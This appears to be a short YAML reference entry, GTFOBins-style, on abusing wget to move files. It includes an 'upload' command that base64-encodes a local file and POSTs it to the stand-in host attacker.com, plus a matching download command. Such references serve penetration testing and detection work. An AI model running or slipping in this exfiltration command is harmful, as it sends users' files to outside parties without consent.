---
functions:
  upload:
    - description: Send base64-encoded local file via "d" parameter of a HTTP POST request. Run an HTTP service on the attacker box to collect the file.
      code: |
        export URL=http://attacker.com/
        export LFILE=file_to_send
        wget --post-data="d=$(base64 $LFILE | tr -d '\n')" $URL
  download:
    - description: Fetch a remote file via HTTP GET request.
      code: |
        export URL=http://attacker.com/file_to_get
        export LFILE=file_to_save
        wget $URL -O $LFILE
---
